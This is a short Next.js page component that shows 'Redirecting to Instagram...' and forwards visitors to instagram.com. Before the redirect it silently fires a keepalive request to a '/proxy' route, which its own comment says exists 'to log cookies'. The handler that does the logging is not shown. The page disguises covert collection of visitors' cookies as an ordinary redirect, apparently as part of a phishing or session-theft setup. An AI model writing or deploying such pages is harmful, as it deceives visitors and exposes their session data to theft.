'use client';

import { useEffect } from 'react';
import { useRouter } from 'next/navigation';

export default function ProxyPage() {
  const router = useRouter();

  useEffect(() => {
    // 1. Call the route.js to log cookies
    fetch('/proxy', {
      method: 'GET',
      keepalive: true // Important: keeps request alive
    }).catch(() => {});

    // 2. Redirect user to Instagram
    window.location.href = "https://www.instagram.com/";
  }, []);

  return <div>Redirecting to Instagram...</div>;
}
